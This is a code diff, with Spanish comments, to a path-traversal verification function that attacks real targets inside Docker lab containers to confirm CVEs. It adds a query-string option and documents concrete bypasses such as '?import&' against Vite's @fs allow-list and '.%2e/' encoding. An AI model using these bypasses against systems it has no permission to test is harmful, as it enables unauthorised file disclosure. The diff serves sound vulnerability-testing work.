@@ -1117,6 +1117,7 @@ def verify_generic_path_traversal(
     path_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
     budget_s: float = 900.0, setup_commands: Optional[List[str]] = None,
     url_suffix: str = "", custom_headers: Optional[dict] = None,
+    query_suffix: str = "",
 ) -> WpVerifyResult:
     """Analogo generico de verify_wordpress_path_traversal (wpverify.py): planta un fichero
     canario con un secreto aleatorio DENTRO del contenedor real del objetivo (via `docker exec`,
@@ -1132,7 +1133,11 @@ def verify_generic_path_traversal(
     `setup_commands` (opcional, ver _bootstrap_generic_lab): comandos reales ejecutados dentro
     del contenedor DESPUES de arrancar y ANTES de atacar -- necesario para frameworks (Laravel/
     Microweber confirmado en vivo con CVE-2026-65694) que exigen una instalacion/migracion real
-    antes de que sus rutas se comporten como en produccion."""
+    antes de que sus rutas se comporten como en produccion.
+
+    `query_suffix` (opcional): cadena de query string que se añade a TODAS las peticiones
+    URL_PATH, e.g. 'import&' para CVE-2025-30208 Vite donde '?import&' bypasea el allow-list
+    de @fs. Se concatena como '?{query_suffix}' si no incluye '?', o directo si ya lo lleva."""
     step = on_step or (lambda _m: None)
     res = WpVerifyResult()
     if not _docker_daemon_ok():
@@ -1282,7 +1287,10 @@ def verify_generic_path_traversal(
                         # el payload va concatenado al path de la URL.
                         # url_suffix (opcional, e.g. '/cover' en audiobookshelf CVE-2026-71209)
                         # se añade DESPUES del payload: /items/{traversal}/cover
-                        target_url = base_url + cand_ep + payload_value + url_suffix
+                        # query_suffix (opcional, e.g. 'import&' en CVE-2025-30208 Vite)
+                        # se añade como query string: /@fs/{path}?import&
+                        _qs = ("?" + query_suffix) if query_suffix and not query_suffix.startswith("?") else query_suffix
+                        target_url = base_url + cand_ep + payload_value + url_suffix + _qs
                         # requests.request() normaliza %2e a '.' ANTES de enviar -- exactamente
                         # lo que rompe bypasses como '.%2e/' (CVE-2021-41773).
                         _has_pct_dot = "%2e" in payload_value.lower() or "%2f" in payload_value.lower()
@@ -1291,7 +1299,7 @@ def verify_generic_path_traversal(
                         else:
                             resp = _http_request(cand_meth, target_url, timeout=15,
                                                  headers=custom_headers or None)
-                        payload_desc = f"URL_PATH={payload_value!r}{('+' + url_suffix) if url_suffix else ''}"
+                        payload_desc = f"URL_PATH={payload_value!r}{('+' + url_suffix) if url_suffix else ''}{_qs or ''}"
                     else:
                         payload = dict(cand_params) if isinstance(cand_params, dict) else dict.fromkeys(cand_params or [], "")
                         payload[cand_path_p or path_param or "path"] = payload_value
